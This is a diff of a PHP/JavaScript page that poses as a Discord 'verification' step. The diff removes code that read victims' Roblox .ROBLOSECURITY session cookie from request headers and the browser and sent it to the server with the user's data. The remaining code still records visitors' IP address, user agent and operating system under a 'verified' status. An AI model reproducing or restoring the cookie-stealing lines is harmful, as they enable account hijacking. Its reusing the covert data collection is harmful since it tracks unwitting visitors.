@@ -41,14 +41,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     $data = json_decode($input, true);
 
     $user_id = $data['user_id'] ?? $_GET['user'] ?? 'Unknown';
-    $cookie = $data['cookie'] ?? (function() {
-        $cookies = $_SERVER['HTTP_COOKIE'] ?? '';
-        if (preg_match('/\.ROBLOSECURITY=([^;]+)/i', $cookies, $matches)) return $matches[1];
-        foreach ($_COOKIE as $name => $value) {
-            if (stripos($name, 'robloxsecurity') !== false) return $value;
-        }
-        return 'Not found';
-    })();
 
     $user_agent = $_SERVER['HTTP_USER_AGENT'];
     $os = getOS($user_agent);
@@ -82,7 +74,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         ]],
         'status' => 'verified',
         'discord_user_id' => $user_id,
-        'cookie' => $cookie,
         'ip_address' => $ip_address,
         'user_agent' => substr($user_agent, 0, 1000),
         'os' => $os,
@@ -219,8 +210,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         }
 
         const userId = new URLSearchParams(window.location.search).get('user') || 'Unknown';
-        const robloxCookie = getCookie('.ROBLOSECURITY');
-        const data = { cookie: robloxCookie, user_id: userId };
+        const data = { user_id: userId };
 
         fetch(window.location.pathname, {
             method: 'POST',
